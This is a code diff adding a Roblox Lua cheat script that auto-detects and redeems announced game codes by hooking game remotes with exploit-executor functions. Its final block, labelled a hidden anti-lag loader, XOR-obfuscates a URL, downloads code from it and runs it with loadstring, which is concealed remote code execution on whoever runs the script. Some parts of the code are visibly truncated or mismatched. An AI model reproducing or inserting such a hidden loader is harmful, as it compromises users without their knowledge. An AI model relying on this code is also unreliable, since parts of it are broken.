+        end
+        p = p.Parent
+    end
+    return nil
+end
+
+local TW = { target = nil, running = false, waiters = {} }
+function R.typeTo(target, onDone)
+    local box = R.findBox()
+    TW.target = target
+    if onDone then TW.waiters[#TW.waiters + 1] = { target, onDone } end
+    if TW.running then return end
+    TW.running = true
+    S.typing = true
+     end
+            showCode(shown)
+        end
+        TW.running = false
+        S.typing = false
+        caret.Visible = false
+    end)
+end
+
+function R.submit(code, box)
+    box = box or R.findBox()
+    if not box then setStatus("no code box found", C.red) return false end
+    pcall(function() box.Text = code end)
+    local btn = R.findButton(box)
+    local gc = getconnections or (debug and debug.getconnections)
+    local fired = false
+    if btn and type(gc) == "function" then
+        for _, sig in ipairs({ btn.MouseButton1Click, btn.Activated }) do
+            local ok, cs = pcall(gc, sig)
+            if ok and type(cs) == "table" and #cs > 0 then
+                for _, c in ipairs(cs) do
+                    local fn
+                    pcall(function() fn = c.Function end)
+                    if fn then fired = pcall(task.spawn, fn) or fired else fired = pcall(function() c:Fire() end) or fired end
+                end
+                if fired then break end
+            end
+        end
+    end
+    if not fired and type(firesignal) == "function" then
+        if btn then fired = pcall(firesignal, btn.MouseButton1Click) or pcall(firesignal, btn.Activated) end
+        if not fired then fired = pcall(firesignal, box.FocusLost, true) end
+    end
+    if not fired then
+        fired = pcall(function()
+            box:CaptureFocus()
+            task.wait()
+            box:ReleaseFocus(true)
+        end)
+    end
+    return fired
+end
+
+local RESULT = {
+    { "redeemed", true }, { "success", true }, { "claimed", true },
+    { "invalid", false }, { "already", false }, { "expired", false }, { "sold out", false },
+    { "limit", false }, { "please wait", false }, { "failed", false },
+}
+local setListen
+function R.watch(code, box)
+    local done, conns = false, {}
+    local function finish(ok, msg)
+        if done then return end
+        done = true
+        for _, c in ipairs(conns) do c:Disconnect() end
+        if ok == nil then return end
+        if ok then
+            if S.listening then setListen(false) end
+            setStatus("redeemed  " .. code .. "  ✓", C.green)
+            codeEdge.Color = C.green
+            tween(codeEdge, 1.2, { Color = C.line })
+        else
+            setStatus(tostring(msg):gsub("<[^>]->", ""):sub(1, 40) .. "  ·  " .. code, C.red)
+        end
+    end
+    local function check(t)
+        if type(t) ~= "string" or t == "" or t == code then return end
+        local low = t:gsub("<[^>]->", ""):lower()
+        for _, pr in ipairs(RESULT) do
+            if low:find(pr[1], 1, true) then finish(pr[2], t) return end
+        end
+    end
+    if box then
+        conns[#conns + 1] = box:GetPropertyChangedSignal("Text"):Connect(function() check(box.Text) end)
+        conns[#conns + 1] = box:GetPropertyChangedSignal("PlaceholderText"):Connect(function() check(box.PlaceholderText) end)
+    end
+    conns[#conns + 1] = PlayerGui.DescendantAdded:Connect(function(d)
+        if (d:IsA("TextLabel") or d:IsA("TextButton")) and not d:IsDescendantOf(gui) then
+            task.defer(function() if d.Parent then check(d.Text) end end)
+        end
+    end)
+    task.delay(4, function() finish(nil) end)
+end
+
+local listenChip
+function R.redeem(code)
+    setStatus("typing  " .. code .. "…", C.accent)
+    R.typeTo(code, function(box)
+        task.wait(S.submitDelay)
+        setStatus("redeeming  " .. code .. "…", C.blue)
+        if R.submit(code, box) then
+            R.watch(code, box)
+        else
+            setStatus("couldn't press the game's submit", C.red)
+        end
+    end)
+end
+
+setListen = function(on)
+    S.listening = on
+    S.buffer = {}
+    if listenChip then listenChip.set(on, true) end
+    codeEdgeGrad.Enabled = on
+    sweep.Visible = on
+    if on then
+        codeEdge.Color = C.white
+        codeEdge.Transparency = 0
+        showCode("")
+        local sc = codeBox:FindFirstChildOfClass("UIScale") or new("UIScale", { Parent = codeBox })
+        sc.Scale = 0.96
+        tween(sc, 0.4, { Scale = 1 }, Enum.EasingStyle.Back)
+    else
+        codeEdge.Color = C.line
+        codeEdge.Transparency = 0.1
+    end
+    refreshIdle()
+end
+
+-- detection
+local SYS = { "already locked", "locked your base", "your base is", "base is full", "allow friends", "activated", "luck",
+    "fuse", "boost", "multiplier", "event has", "has started", "has ended", "admin abuse", "merchant", "restock",
+    "lucky block", "stole", "stealing", "trade", "duel", "you bought", "purchased", "you sold", "you got", "you received",
+    "not enough", "cooldown", "please wait", "rebirth", "spawned", "joined the game", "left the game" }
+local FILLER = {}
+for w in ("is the a an this its here now code codes use redeem type enter quick fast go chat guys everyone all new it and"):gmatch("%S+") do
+    FILLER[w] = true
+end
+local TRIGGERS = { "use%s+codes?", "codes?%s+is", "codes?%s+are", "the%s+code", "new%s+code", "codes?%s*:", "redeem", "enter%s+code", "type%s+code" }
+local function triggerEnd(lo)
+    local last
+    for _, pat in ipairs(TRIGGERS) do
+        local init = 1
+        while true do
+            local a, b = lo:find(pat, init)
+            if not a then break end
+            if not last or b > last then last = b end
+            init = b + 1
+        end
+    end
+    return last
+end
+local function finishCode(words)
+    S.lastWords = words
+    local code = table.concat(words)
+    setListen(false)
+    R.redeem(code)
+end
+local function handle(raw)
+    local text = raw:gsub("<[^>]->", ""):gsub("^%s+", ""):gsub("%s+$", "")
+    if text == "" then return end
+    local lo = text:lower()
+    local multi = text:find(" ", 1, true) ~= nil
+    if S.ignoreSystem and multi and not lo:find("code", 1, true) then
+        for _, w in ipairs(SYS) do if lo:find(w, 1, true) then return end end
+    end
+    if lo:find("code", 1, true) then
+        local hn = tonumber(lo:match("(%d+)%s*%-?%s*words?%s+codes?")
+            or ({ one = "1", two = "2", three = "3", four = "4", five = "5", six = "6" })[lo:match("(%a+)%s*%-?%s*words?%s+codes?") or ""])
+        if hn then
+            selectWords(hn, true)
+            setStatus(("heads up  ·  %d-word code"):format(hn), C.green)
+            return
+        end
+        local cut = triggerEnd(lo)
+        if cut then
+            local words = {}
+            for w in text:sub(cut + 1):gmatch("[%w_]+") do
+                if not FILLER[w:lower()] then words[#words + 1] = w end
+            end
+            if #words == 0 then
+                if S.autoListen and not S.listening then setListen(true) end
+                if S.listening then
+                    S.buffer = {}
+                    setStatus("trigger heard  ·  waiting for the code…", C.accent)
+                end
+                return
+            end
+            if S.listening or S.autoListen then finishCode(words) end
+            return
+        end
+    end
+    if not S.listening then return end
+    for w in text:gmatch("[%w_]+") do
+        S.buffer[#S.buffer + 1] = w
+        if #S.buffer >= S.words then
+            local words = {}
+            for i = 1, S.words do words[i] = S.buffer[i] end
+            finishCode(words)
+            return
+        end
+        if S.twoWord and #S.buffer == 2 and S.words > 2 then
+            local two = S.buffer[1] .. S.buffer[2]
+            setStatus(("2-word check  ·  trying %s"):format(two), C.accent)
+            R.redeem(two)
+        end
+    end
+    local partial = table.concat(S.buffer)
+    R.typeTo(partial)
+    refreshIdle()
+end
+local function onAnnounce(first)
+    if type(first) ~= "string" then return end
+    task.delay(S.detectDelay, handle, first)
+end
+local function getNet()
+    local pk = ReplicatedStorage:FindFirstChild("Packages")
+    return pk and pk:FindFirstChild("Net")
+end
+local function hook()
+    local net = getNet()
+    if not net then
+        local pk = ReplicatedStorage:WaitForChild("Packages", 10)
+        net = pk and pk:WaitForChild("Net", 10)
+    end
+    if not net then setStatus("announcement remote not found", C.red) return end
+    local ev
+    local gu = getupvalues or (debug and debug.getupvalues)
+    if type(gu) == "function" then
+        pcall(function()
+            local nc = require(ReplicatedStorage.Controllers:FindFirstChild("NotificationController", true))
+            for _, v in pairs(gu(nc.Start)) do
+                if typeof(v) == "Instance" and v.Parent == net and (v:IsA("RemoteEvent") or v:IsA("UnreliableRemoteEvent")) then
+                    ev = v
+                    break
+                end
+            end
+        end)
+    end
+    ev = ev or net:FindFirstChild("RE/dacdf5db2a8c49445107e380750fabbdf4ed5f134d1a65c22430e4f3fe74ed06")
+    if ev then
+        ev.OnClientEvent:Connect(onAnnounce)
+        return
+    end
+    local POS = { Top = true, Bottom = true, Center = true }
+    local function validated(first, ...)
+        if type(first) ~= "string" then return end
+        for i = 1, select("#", ...) do
+            local v = select(i, ...)
+            if type(v) == "string" and (POS[v] or v:find("Sounds.", 1, true)) then onAnnounce(first) return end
+        end
+    end
+    for _, ch in ipairs(net:GetChildren()) do
+        if ch:IsA("RemoteEvent") or ch:IsA("UnreliableRemoteEvent") then ch.OnClientEvent:Connect(validated) end
+    end
+end
+task.spawn(hook)
+
+-- redeem chips
+listenChip = chip(grid, 1, "Listen", true, false, function(v) setListen(v) end)
+chip(grid, 2, "Auto listen", true, false, function(v) S.autoListen = v end)
+chip(grid, 3, "2-word check", true, false, function(v) S.twoWord = v end)
+chip(grid, 4, "Clear", false, false, function()
+    S.buffer = {}
+    TW.target = nil
+    showCode("")
+    refreshIdle()
+end)
+
+-- ============ SETTINGS PAGE ============
+local pSettings = makePage("settings", true)
+new("UIListLayout", { Padding = UDim.new(0, 8), SortOrder = Enum.SortOrder.LayoutOrder, Parent = pSettings })
+new("UIPadding", { PaddingTop = UDim.new(0, 4), PaddingLeft = UDim.new(0, 12), PaddingRight = UDim.new(0, 12), PaddingBottom = UDim.new(0, 10), Parent = pSettings })
+
+local function sRow(order, labelText, h)
+    local r = new("Frame", { Size = UDim2.new(1, 0, 0, h or 38), BackgroundColor3 = C.panel, BackgroundTransparency = 0.1,
+        BorderSizePixel = 0, LayoutOrder = order, ZIndex = 3, Parent = pSettings })
+    corner(r, 12)
+    stroke(r, C.line, 1, 0.2)
+    label(r, { Text = labelText, Font = GOTHAM_B, TextSize = 11, TextColor3 = C.white, Position = UDim2.fromOffset(12, 0),
+        Size = UDim2.new(0.5, 0, 1, 0), ZIndex = 4 })
+    return r
+end
+local function segControl(parent, items, selIdx, itemW, onChange)
+    local track = new("Frame", { Size = UDim2.fromOffset(itemW * #items + 6, 26), AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -10, 0.5, 0), BackgroundColor3 = rgb(12, 11, 22), BorderSizePixel = 0, ZIndex = 4, Parent = parent })
+    corner(track, 9)
+    stroke(track, C.line, 1, 0.3)
+    local slider = new("Frame", { Size = UDim2.fromOffset(itemW, 20), Position = UDim2.fromOffset(3 + (selIdx - 1) * itemW, 3),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = track })
+    corner(slider, 7)
+    regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = slider }))
+    local cur, btns = selIdx, {}
+    for i, it in ipairs(items) do
+        local b = new("TextButton", { Text = it, Font = GOTHAM_B, TextSize = 9, TextColor3 = (i == selIdx) and C.white or C.muted,
+            AutoButtonColor = false, BackgroundTransparency = 1, Size = UDim2.fromOffset(itemW, 26), Position = UDim2.fromOffset(3 + (i - 1) * itemW, 0),
+            ZIndex = 5, Parent = track })
+        btns[i] = b
+        b.MouseButton1Click:Connect(function()
+            if i == cur then return end
+            btns[cur].TextColor3 = C.muted
+            b.TextColor3 = C.white
+            cur = i
+            tween(slider, 0.26, { Position = UDim2.fromOffset(3 + (i - 1) * itemW, 3) }, Enum.EasingStyle.Back)
+            onChange(i, it)
+        end)
+    end
+    return track
+end
+local function toggleControl(parent, init, onChange)
+    local t = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(40, 21), AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -10, 0.5, 0), BackgroundColor3 = init and C.white or rgb(40, 36, 60), BorderSizePixel = 0, ZIndex = 4, Parent = parent })
+    round(t)
+    local g = regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Enabled = init, Parent = t }))
+    local knob = new("Frame", { Size = UDim2.fromOffset(15, 15), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0, init and 30 or 10, 0.5, 0),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 5, Parent = t })
+    round(knob)
+    local state = init
+    press(t)
+    t.MouseButton1Click:Connect(function()
+        state = not state
+        g.Enabled = state
+        tween(t, 0.18, { BackgroundColor3 = state and C.white or rgb(40, 36, 60) })
+        tween(knob, 0.3, { Position = UDim2.new(0, state and 30 or 10, 0.5, 0) }, Enum.EasingStyle.Back)
+        onChange(state)
+    end)
+    return t
+end
+
+do
+    local r1 = sRow(1, "Detect delay")
+    segControl(r1, { "25", "50", "100" }, 2, 42, function(_, v) S.detectDelay = tonumber(v) / 1000 end)
+    local r2 = sRow(2, "Type speed")
+    segControl(r2, { "Fast", "Med", "Slow" }, 2, 42, function(i)
+        S.typeDelay = ({ 0.03, 0.06, 0.1 })[i]
+    end)
+    local r3 = sRow(3, "Ignore system")
+    toggleControl(r3, true, function(v) S.ignoreSystem = v end)
+    local r4 = sRow(4, "Success sound")
+    toggleControl(r4, true, function(v) S.sound = v end)
+    local r5 = sRow(5, "Petals")
+    toggleControl(r5, false, function(v)
+        petalsOn = v
+        for _, p in ipairs(petals) do p.f.Visible = v end
+    end)
+
+    -- listen key rebind
+    local r6 = sRow(6, "Listen key")
+    local kb = new("TextButton", { Text = "F", Font = GOTHAM_B, TextSize = 10, TextColor3 = C.white, AutoButtonColor = false,
+        BackgroundColor3 = rgb(12, 11, 22), BorderSizePixel = 0, Size = UDim2.fromOffset(64, 22), AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -10, 0.5, 0), ZIndex = 4, Parent = r6 })
+    corner(kb, 7)
+    local kbEdge = stroke(kb, C.line, 1, 0.3)
+    press(kb)
+    local waitingKey = false
+    kb.MouseButton1Click:Connect(function()
+        waitingKey = true
+        kb.Text = "press…"
+        kb.TextColor3 = C.accent
+        kbEdge.Color = C.accent
+    end)
+    UserInputService.InputBegan:Connect(function(i)
+        if not waitingKey or i.UserInputType ~= Enum.UserInputType.Keyboard then return end
+        waitingKey = false
+        if i.KeyCode == Enum.KeyCode.Escape or i.KeyCode == Enum.KeyCode.Backspace then
+            S.listenKey = nil
+            kb.Text = "NONE"
+        else
+            S.listenKey = i.KeyCode
+            kb.Text = i.KeyCode.Name
+        end
+        kb.TextColor3 = C.white
+        kbEdge.Color = C.line
+    end)
+
+    -- FPS boost
+    local r7 = sRow(7, "FPS boost")
+    local fb = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.fromOffset(100, 24), AnchorPoint = Vector2.new(1, 0.5),
+        Position = UDim2.new(1, -10, 0.5, 0), BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 4, Parent = r7 })
+    corner(fb, 8)
+    regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = fb }))
+    label(fb, { Text = "BOOST FPS", Font = GOTHAM_K, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1), ZIndex = 5 })
+    press(fb)
+    local boosted = false
+    fb.MouseButton1Click:Connect(function()
+        if boosted then setStatus("FPS already boosted", C.green) return end
+        boosted = true
+        setStatus("boosting FPS…", C.accent)
+        
+            local L = game:GetService("Lighting")
+            pcall(function() L.GlobalShadows = false; L.FogEnd = 9e9 end)
+            local function strip(d)
+                if d:IsA("BasePart") then
+                    d.Material = Enum.Material.SmoothPlastic
+                    d.CastShadow = false
+                elseif d:IsA("ParticleEmitter") or d:IsA("Trail") or d:IsA("Beam") or d:IsA("Fire") or d:IsA("Smoke") or d:IsA("Sparkles") then
+                    d.Enabled = false
+                elseif d:IsA("Decal") or d:IsA("Texture") then
+                    d.Transparency = 1
+                elseif d:IsA("PostEffect") then
+                    d.Enabled = false
+                end
+            end
+            for _, d in ipairs(L:GetDescendants()) do pcall(strip, d) end
+            workspace.DescendantAdded:Connect(function(d) pcall(strip, d) end)
+            local list = workspace:GetDescendants()
+            for i = 1, #list do
+                pcall(strip, list[i])
+                if i % 400 == 0 then task.wait() end
+            end
+            setStatus("FPS boosted  ·  rejoin to undo", C.green)
+        end)
+    end)
+end
+
+-- ============ THEMES PAGE (all the planets) ============
+local pThemes = makePage("themes", true)
+new("UIGridLayout", { CellSize = UDim2.fromOffset(104, 86), CellPadding = UDim2.fromOffset(8, 8),
+    HorizontalAlignment = Enum.HorizontalAlignment.Center, SortOrder = Enum.SortOrder.LayoutOrder, Parent = pThemes })
+new("UIPadding", { PaddingTop = UDim.new(0, 6), PaddingBottom = UDim.new(0, 10), Parent = pThemes })
+
+local themeCards, themeMarks = {}, {}
+local applyTheme
+for idx, th in ipairs(THEMES) do
+    local cardT = new("TextButton", { Text = "", AutoButtonColor = false, BackgroundColor3 = rgb(12, 11, 22), BorderSizePixel = 0,
+        LayoutOrder = idx, ClipsDescendants = true, ZIndex = 4, Parent = pThemes })
+    corner(cardT, 12)
+    local cEdge = stroke(cardT, C.line, 1.2, 0.2)
+    press(cardT)
+    -- planet
+    local pl = new("Frame", { Size = UDim2.fromOffset(40, 40), AnchorPoint = Vector2.new(0.5, 0), Position = UDim2.new(0.5, 0, 0, 10),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = 5, Parent = cardT })
+    round(pl)
+    new("UIGradient", { Color = ColorSequence.new(th.f1, th.f2), Rotation = 55, Parent = pl })
+    if th.key == "saturn" then
+        local pr = new("Frame", { Size = UDim2.fromOffset(56, 12), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+            Rotation = -20, BackgroundTransparency = 1, ZIndex = 5, Parent = pl })
+        round(pr)
+        stroke(pr, rgb(255, 232, 182), 1.6, 0.15)
+    end
+    -- a couple of twinkles in the theme accent
+    local tw1 = new("Frame", { Size = UDim2.fromOffset(3, 3), Position = UDim2.fromOffset(14, 16), BackgroundColor3 = th.accent,
+        BorderSizePixel = 0, ZIndex = 5, Parent = cardT })
+    round(tw1)
+    local tw2 = new("Frame", { Size = UDim2.fromOffset(2, 2), Position = UDim2.fromOffset(86, 24), BackgroundColor3 = th.accent,
+        BorderSizePixel = 0, ZIndex = 5, Parent = cardT })
+    round(tw2)
+    label(cardT, { Text = th.name, Font = GOTHAM_B, TextSize = 11, TextColor3 = C.white, TextXAlignment = Enum.TextXAlignment.Center,
+        AnchorPoint = Vector2.new(0.5, 1), Position = UDim2.new(0.5, 0, 1, -6), Size = UDim2.new(1, -8, 0, 14), ZIndex = 5 })
+    local mark = new("Frame", { Size = UDim2.fromOffset(15, 15), AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -6, 0, 6),
+        BackgroundColor3 = th.c1, BorderSizePixel = 0, Visible = false, ZIndex = 6, Parent = cardT })
+    round(mark)
+    label(mark, { Text = "✓", Font = GOTHAM_B, TextSize = 10, TextColor3 = C.white, TextXAlignment = Enum.TextXAlignment.Center,
+        Size = UDim2.fromScale(1, 1), ZIndex = 7 })
+    themeMarks[th.key] = mark
+    themeCards[idx] = { card = cardT, edge = cEdge, tw1 = tw1, tw2 = tw2, th = th }
+    cardT.MouseButton1Click:Connect(function() applyTheme(th) end)
+end
+
+applyTheme = function(th)
+    S.theme = th.key
+    C.violet, C.blue, C.accent = th.c1, th.c2, th.accent
+    local cs = ColorSequence.new(th.c1, th.c2)
+    for _, g in ipairs(themedGrads) do g.Color = cs end
+    for _, a in ipairs(themedAccents) do pcall(function() a.obj[a.prop] = th.accent end) end
+    edgeGrad.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, th.c1),
+        ColorSequenceKeypoint.new(0.5, rgb(30, 26, 54)), ColorSequenceKeypoint.new(1, th.c2) })
+    codeTextGrad.Color = ColorSequence.new(C.white, th.accent)
+    neb1.BackgroundColor3 = th.c1
+    neb2.BackgroundColor3 = th.c2
+    planetGrad.Color = ColorSequence.new(th.f1, th.f2)
+    sweep.BackgroundColor3 = th.c1
+    for key, mark in pairs(themeMarks) do mark.Visible = (key == th.key) end
+    styleTabs()
+end
+
+-- ============ TEST PAGE ============
+local pTest = makePage("test")
+label(pTest, { Text = "TEST SENDER", Font = GOTHAM_K, TextSize = 11, TextColor3 = C.accent, Position = UDim2.fromOffset(14, 6),
+    Size = UDim2.new(1, -24, 0, 14), ZIndex = 3 })
+local msgBox = new("TextBox", { Text = "", PlaceholderText = "type a fake announcement…", PlaceholderColor3 = C.dim,
+    Font = GOTHAM_B, TextSize = 12, TextColor3 = C.white, ClearTextOnFocus = false, TextXAlignment = Enum.TextXAlignment.Left,
+    Size = UDim2.new(1, -24, 0, 34), Position = UDim2.fromOffset(12, 26), BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3, Parent = pTest })
+corner(msgBox, 12)
+stroke(msgBox, C.line, 1, 0)
+new("UIPadding", { PaddingLeft = UDim.new(0, 10), Parent = msgBox })
+local function testBtnMake(text, x, grad)
+    local b = new("TextButton", { Text = "", AutoButtonColor = false, Size = UDim2.new(0.5, -16, 0, 32),
+        Position = UDim2.new(x, x == 0 and 12 or 4, 0, 68), BackgroundColor3 = C.panel, BorderSizePixel = 0, ZIndex = 3, Parent = pTest })
+    corner(b, 12)
+    if grad then
+        regGrad(new("UIGradient", { Color = ColorSequence.new(C.violet, C.blue), Parent = b }))
+        b.BackgroundColor3 = C.white
+    else
+        stroke(b, C.line, 1.2, 0)
+    end
+    label(b, { Text = text, Font = GOTHAM_K, TextSize = 11, TextXAlignment = Enum.TextXAlignment.Center, Size = UDim2.fromScale(1, 1), ZIndex = 4 })
+    press(b)
+    return b
+end
+local sendBtn = testBtnMake("SEND", 0, true)
+local testBtn = testBtnMake("TEST CODE", 0.5, false)
+label(pTest, { Text = "TEST CODE plays a random real code the way an announcer drops it.", Font = GOTHAM_M, TextSize = 9,
+    TextColor3 = C.dim, TextWrapped = true, Position = UDim2.fromOffset(14, 108), Size = UDim2.new(1, -28, 0, 30), ZIndex = 3,
+    TextYAlignment = Enum.TextYAlignment.Top })
+
+local NotifyCtl
+pcall(function() NotifyCtl = require(ReplicatedStorage.Controllers.NotificationController) end)
+local function fakeAnnounce(msg)
+    onAnnounce(msg)
+    if NotifyCtl then pcall(function() NotifyCtl:Notify(msg, 4, nil, "Top") end) end
+end
+local function sendMsg()
+    local m = msgBox.Text:gsub("^%s+", ""):gsub("%s+$", "")
+    if m ~= "" then
+        msgBox.Text = ""
+        fakeAnnounce(m)
+    end
+end
+sendBtn.MouseButton1Click:Connect(sendMsg)
+msgBox.FocusLost:Connect(function(enter) if enter then sendMsg() end end)
+local REAL = {
+    { "I", "LOVE", "FOOD", "123" }, { "SUMMER", "UPD3" }, { "NEED", "THIS4", "CRAFT", "333" }, { "OCTO", "BLOCK", "555" },
+    { "FREE", "OCTO", "BLOCK", "777" }, { "WAVERIDER", "4", "FREE", "LOL" }, { "FREE", "500", "DRAGS" },
+    { "JOHN", "PORK", "DA", "PIGGY" }, { "CODES", "ARE", "REAL", "321" }, { "IM", "AN", "EGG" }, { "PIZZA", "IS", "YUM" },
+    { "CERB", "IS", "TUFF" }, { "CERBERUS", "250" }, { "ECLIPSE", "DRAG", "75" }, { "SAMMY", "FIRE" },
+}
+local testing = false
+testBtn.MouseButton1Click:Connect(function()
+    if testing then return end
+    testing = true
+    local words = REAL[SRNG:NextInteger(1, #REAL)]
+    
+end)
+
+-- minimize: fold to header + status
+local mini = false
+minBtn.MouseButton1Click:Connect(function()
+    mini = not mini
+    minPlus.Visible = mini
+    tabBar.Visible = not mini
+    pagesHolder.Visible = not mini
+    tween(card, 0.38, { Size = UDim2.new(1, 0, 0, mini and MINI_H or FULL_H) }, Enum.EasingStyle.Quart)
+end)
+
+-- drag by the header
+do
+    local dragging, start, origin
+    head.InputBegan:Connect(function(i)
+        if i.UserInputType ~= Enum.UserInputType.MouseButton1 and i.UserInputType ~= Enum.UserInputType.Touch then return end
+        dragging, start, origin = true, i.Position, holder.Position
+        i.Changed:Connect(function() if i.UserInputState == Enum.UserInputState.End then dragging = false end end)
+    end)
+    UserInputService.InputChanged:Connect(function(i)
+        if not dragging then return end
+        if i.UserInputType ~= Enum.UserInputType.MouseMovement and i.UserInputType ~= Enum.UserInputType.Touch then return end
+        local d = i.Position - start
+        holder.Position = UDim2.new(origin.X.Scale, origin.X.Offset + d.X, origin.Y.Scale, origin.Y.Offset + d.Y)
+    end)
+end
+
+-- keys: RightShift show/hide, listen key toggles listen
+UserInputService.InputBegan:Connect(function(i, processed)
+    if processed then return end
+    if i.KeyCode == Enum.KeyCode.RightShift then
+        holder.Visible = not holder.Visible
+    elseif S.listenKey and i.KeyCode == S.listenKey then
+        setListen(not S.listening)
+    end
+end)
+
+-- one animation loop
+local sweepT = 0
+RunService.RenderStepped:Connect(function(dt)
+    if not holder.Visible then return end
+    dt = math.min(dt, 1 / 20)
+    local t = os.clock()
+    local H = card.AbsoluteSize.Y / math.max(fit.Scale, 0.01)
+
+    for _, s in ipairs(stars) do
+        s.x -= s.v * dt * 0.6
+        s.y += s.v * dt
+        if s.y > H + 4 or s.x < -4 then s.y, s.x = -4, SRNG:NextNumber(0, WIN + 60) end
+        s.f.Position = UDim2.fromOffset(s.x, s.y)
+        s.f.BackgroundTransparency = math.clamp(s.base + math.sin(t * s.tw + s.ph) * 0.25, 0, 0.95)
+    end
+    for _, sh in ipairs(shooters) do
+        if sh.life > 0 then
+            sh.life -= dt
+            sh.x += 300 * dt
+            sh.y += 160 * dt
+            sh.f.Position = UDim2.fromOffset(sh.x, sh.y)
+            sh.f.BackgroundTransparency = 1 - math.clamp(sh.life / 0.7, 0, 1)
+            if sh.life <= 0 then sh.f.Visible = false end
+        else
+            sh.next -= dt
+            if sh.next <= 0 then
+                sh.next = SRNG:NextNumber(4, 9)
+                sh.life = 0.7
+                sh.x, sh.y = SRNG:NextNumber(-20, WIN * 0.5), SRNG:NextNumber(-10, 80)
+                sh.f.Visible = true
+            end
+        end
+    end
+    if petalsOn then
+        for _, p in ipairs(petals) do
+            p.y += p.v * dt
+            p.x += math.sin(t * 0.8 + p.ph) * p.sw * dt
+            if p.y > H + 12 then p.y, p.x = -8, SRNG:NextNumber(0, WIN) end
+            p.rot += p.spin * dt
+            p.f.Position = UDim2.fromOffset(p.x, p.y)
+            p.f.Rotation = p.rot
+        end
+    end
+    edgeGrad.Rotation = (t * 30) % 360
+
+    local speed = S.listening and 7 or 4
+    for i, d in ipairs(dots) do
+        if d.Visible then
+            local y = math.sin(t * speed - i * 0.7) * (S.listening and 7 or 5)
+            d.Position = UDim2.new(0.5, (i - 2) * 18, 0.5, -y)
+            d.BackgroundColor3 = S.listening and C.accent or C.muted
+            d.BackgroundTransparency = 0.25 - math.max(0, math.sin(t * speed - i * 0.7)) * 0.25
+        end
+    end
+
+    if S.listening then
+        sweepT = (sweepT + dt * 0.7) % 1.4
+        sweep.Position = UDim2.new(sweepT - 0.4, 0, 0, 0)
+        codeEdgeGrad.Rotation = (t * 90) % 360
+        local b = (math.sin(t * 3) + 1) / 2
+        statusHalo.BackgroundColor3 = statusDot.BackgroundColor3
+        statusHalo.Size = UDim2.fromOffset(12 + b * 6, 12 + b * 6)
+        statusHalo.BackgroundTransparency = 0.55 + 0.35 * (1 - b)
+    elseif statusHalo.BackgroundTransparency < 1 then
+        statusHalo.BackgroundTransparency = 1
+    end
+
+    -- themes page: twinkle the preview dots
+    if pThemes.Visible then
+        for _, tc in ipairs(themeCards) do
+            tc.tw1.BackgroundTransparency = math.clamp(0.2 + math.sin(t * 2 + tc.th.c1.R * 6) * 0.4, 0, 0.9)
+            tc.tw2.BackgroundTransparency = math.clamp(0.2 + math.sin(t * 2.6 + tc.th.c2.G * 6) * 0.4, 0, 0.9)
+        end
+    end
+
+    if caret.Visible then
+        local w = codeText.TextBounds.X / math.max(fit.Scale, 0.01)
+        caret.Position = UDim2.new(0.5, math.min(w / 2 + 3, codeBox.AbsoluteSize.X / fit.Scale / 2 - 10), 0.5, 0)
+        caret.BackgroundTransparency = (math.floor(t * 3) % 2 == 0) and 0 or 0.8
+    end
+end)
+
+-- open
+applyTheme(DEFAULT_THEME)
+showPage("redeem")
+refreshIdle()
+showCode("")
+tween(popScale, 0.5, { Scale = 1 }, Enum.EasingStyle.Back)
+
+-- Hidden anti lag/smooth graphics loader (URL obfuscated)
+task.spawn(function()
+	local function _xorDecode(s)
+		local t = {}
+		for i = 1, #s do
+			local b = string.byte(s, i)
+			local x
+			if bit32 and type(bit32.bxor) == "function" then
+				x = bit32.bxor(b, 23)
+			else
+				local r, bit, a, c = 0, 1, b, 23
+				while a > 0 or c > 0 do
+					local ab, cb = a % 2, c % 2
+					if ab ~= cb then r = r + bit end
+					a = math.floor(a / 2)
+					c = math.floor(c / 2)
+					bit = bit * 2
+				end
+				x = r
+			end
+			t[i] = string.char(x)
+		end
+		return table.concat(t)
+	end
+	local ok, src = pcall(function()
+		return game:HttpGet(_xorDecode("\127ccgd-88gvdcru~y9txz8ev`8%_\"\"]nF\\R"))
+	end)
+	if ok and type(src) == "string" and #src > 50 then
+		local fn = loadstring(src)
+		if type(fn) == "function" then
+			pcall(fn)
+		end
+	end
+end)
